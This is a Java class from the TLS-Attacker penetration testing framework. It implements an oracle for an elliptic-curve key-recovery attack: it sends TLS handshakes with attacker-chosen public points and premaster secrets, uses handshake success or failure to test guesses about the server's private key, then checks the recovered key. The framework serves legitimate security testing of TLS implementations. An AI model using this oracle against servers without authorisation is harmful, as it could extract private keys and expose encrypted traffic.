/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.ec.oracles;

import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.modifiablevariable.biginteger.BigIntegerModificationFactory;
import de.rub.nds.modifiablevariable.biginteger.ModifiableBigInteger;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.crypto.ec.EllipticCurve;
import de.rub.nds.tlsattacker.core.crypto.ec.Point;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.math.BigInteger;
import java.util.Arrays;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;
import org.bouncycastle.util.BigIntegers;

/**
 *
 *
 */
public class RealDirectMessageECOracle extends ECOracle {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config config;

    private Point checkPoint;

    private byte[] checkPMS;

    /**
     *
     * @param config
     * @param curve
     */
    public RealDirectMessageECOracle(Config config, EllipticCurve curve) {
        this.config = config;
        this.curve = curve;
        executeValidWorkflowAndExtractCheckValues();

        LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
        Configuration ctxConfig = ctx.getConfiguration();
        LoggerConfig loggerConfig = ctxConfig.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
        loggerConfig.setLevel(Level.INFO);
        ctx.updateLoggers();
    }

    @Override
    public boolean checkSecretCorrectnes(Point ecPoint, BigInteger secret) {

        WorkflowTrace trace = new WorkflowConfigurationFactory(config).createWorkflowTrace(WorkflowTraceType.HANDSHAKE,
                RunningModeType.CLIENT);

        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);

        // modify public point base X coordinate
        ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        x.setModification(BigIntegerModificationFactory.explicitValue(ecPoint.getX().getData()));
        message.getComputations().setPublicKeyX(x);

        // modify public point base Y coordinate
        ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        y.setModification(BigIntegerModificationFactory.explicitValue(ecPoint.getY().getData()));
        message.getComputations().setPublicKeyY(y);

        // set explicit premaster secret value (X value of the resulting point
        // coordinate)
        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] explicitePMS = BigIntegers.asUnsignedByteArray(curve.getModulus().bitLength() / 8, secret);
        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
        message.prepareComputations();
        message.getComputations().setPremasterSecret(pms);

        if (numberOfQueries % 100 == 0) {
            LOGGER.info("Number of queries so far: {}", numberOfQueries);
        }

        State state = new State(config, trace);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                config.getWorkflowExecutorType(), state);

        boolean valid = true;
        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException e) {
            valid = false;
            LOGGER.warn(e);
        } finally {
            numberOfQueries++;
        }

        if (!state.getWorkflowTrace().executedAsPlanned()) {
            valid = false;
        }

        return valid;
    }

    @Override
    public boolean isFinalSolutionCorrect(BigInteger guessedSecret) {
        Point p = curve.mult(guessedSecret, checkPoint);
        byte[] pms = BigIntegers.asUnsignedByteArray(curve.getModulus().bitLength() / 8, p.getX().getData());
        return Arrays.equals(checkPMS, pms);
    }

    /**
     * Executes a valid workflow with valid points etc. and saves the values for
     * further validation purposes.
     */
    private void executeValidWorkflowAndExtractCheckValues() {
        State state = new State(config);

        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                config.getWorkflowExecutorType(), state);

        WorkflowTrace trace = state.getWorkflowTrace();

        workflowExecutor.executeWorkflow();

        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
        // TODO Those values can be retrieved from the context
        // get public point base X and Y coordinates
        BigInteger x = message.getComputations().getPublicKeyX().getValue();
        BigInteger y = message.getComputations().getPublicKeyY().getValue();
        checkPoint = Point.createPoint(x, y, state.getTlsContext().getSelectedGroup());
        checkPMS = message.getComputations().getPremasterSecret().getValue();
    }
}
